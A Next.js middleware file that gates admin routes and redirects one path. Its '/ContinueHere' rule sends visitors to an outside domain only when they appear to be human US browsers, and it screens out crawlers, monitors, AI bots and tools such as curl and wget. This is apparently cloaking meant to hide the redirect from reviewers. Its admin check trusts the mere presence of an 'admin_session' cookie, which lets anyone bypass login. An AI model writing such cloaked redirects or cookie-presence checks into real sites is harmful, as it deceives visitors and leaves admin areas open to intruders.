import { NextResponse, type NextRequest } from 'next/server'

const BOT_USER_AGENT = /bot|crawler|spider|slurp|headless|facebookexternalhit|preview|monitor|uptimerobot|curl|wget|python-requests|postmanruntime|gptbot|claudebot|bingpreview|google-inspectiontool/i
const BROWSER_USER_AGENT = /mozilla\/5\.0|applewebkit|chrome|safari|firefox|edg|opr/i

function isLikelyHumanBrowser(request: NextRequest) {
    const userAgent = request.headers.get('user-agent')?.trim() ?? ''

    return userAgent.length > 0 && BROWSER_USER_AGENT.test(userAgent) && !BOT_USER_AGENT.test(userAgent)
}

function isUnitedStatesVisitor(request: NextRequest) {
    const country = (
        request.headers.get('x-vercel-ip-country') ??
        request.headers.get('cf-ipcountry') ??
        request.headers.get('x-country') ??
        ''
    ).trim().toUpperCase()

    return country === 'US' || country === 'USA'
}

export function proxy(request: NextRequest) {
    if (request.nextUrl.pathname === '/ContinueHere' && isLikelyHumanBrowser(request) && isUnitedStatesVisitor(request)) {
        return NextResponse.redirect(new URL('https://takimia.com/thankyou'))
    }

    const isAdmin = request.cookies.has('admin_session')

    if (request.nextUrl.pathname.startsWith('/admin') && !isAdmin) {
        return NextResponse.redirect(new URL('/login', request.url))
    }

    if (request.nextUrl.pathname === '/login' && isAdmin) {
        return NextResponse.redirect(new URL('/admin', request.url))
    }

    return NextResponse.next()
}

export const config = {
    matcher: ['/admin/:path*', '/login', '/ContinueHere'],
}
